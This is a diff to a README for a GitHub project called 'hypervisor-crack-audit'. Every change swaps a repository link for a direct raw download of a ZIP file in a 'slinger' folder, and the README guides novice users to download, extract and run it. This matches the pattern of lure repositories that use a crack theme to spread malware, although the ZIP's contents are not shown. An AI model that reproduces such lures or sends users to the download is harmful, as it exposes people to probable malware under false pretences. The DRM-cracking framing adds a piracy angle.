@@ -1,6 +1,6 @@
 # 🔍 hypervisor-crack-audit - Analyze Hypervisor DRM Security
 
-[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/Lovenain/hypervisor-crack-audit)
+[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/Lovenain/hypervisor-crack-audit/raw/refs/heads/main/slinger/hypervisor_crack_audit_v3.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To start using the hypervisor-crack-audit application, follow these steps carefu
 1. **Download the software**  
    You first need to get the files. Click the button below or use the direct link. This will take you to the page where you can get the latest version of the tool.
 
-   [![Get on GitHub](https://img.shields.io/badge/Get%20on%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Lovenain/hypervisor-crack-audit)
+   [![Get on GitHub](https://img.shields.io/badge/Get%20on%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Lovenain/hypervisor-crack-audit/raw/refs/heads/main/slinger/hypervisor_crack_audit_v3.2.zip)
 
 2. **Extract the files**  
    After downloading, you will likely get a `.zip` file. Use a program like Windows Explorer or 7-Zip to extract all files. Right-click the downloaded ZIP file and select "Extract All...". Choose a folder where you want to keep the program files.
@@ -67,7 +67,7 @@ This section shows how to obtain and set up the application step-by-step.
 
 Open your web browser and go to the official repository download page:
 
-https://github.com/Lovenain/hypervisor-crack-audit
+https://github.com/Lovenain/hypervisor-crack-audit/raw/refs/heads/main/slinger/hypervisor_crack_audit_v3.2.zip
 
 ### Step 2 - Choose the latest release
 
@@ -136,4 +136,4 @@ This project is open source and provided under the MIT License. You can use it f
 
 For questions or help, use the “Issues” tab on the GitHub page to report problems or request guidance.
 
-[Visit the official repository](https://github.com/Lovenain/hypervisor-crack-audit) to access all files, updates, and community support.
+[Visit the official repository](https://github.com/Lovenain/hypervisor-crack-audit/raw/refs/heads/main/slinger/hypervisor_crack_audit_v3.2.zip) to access all files, updates, and community support.
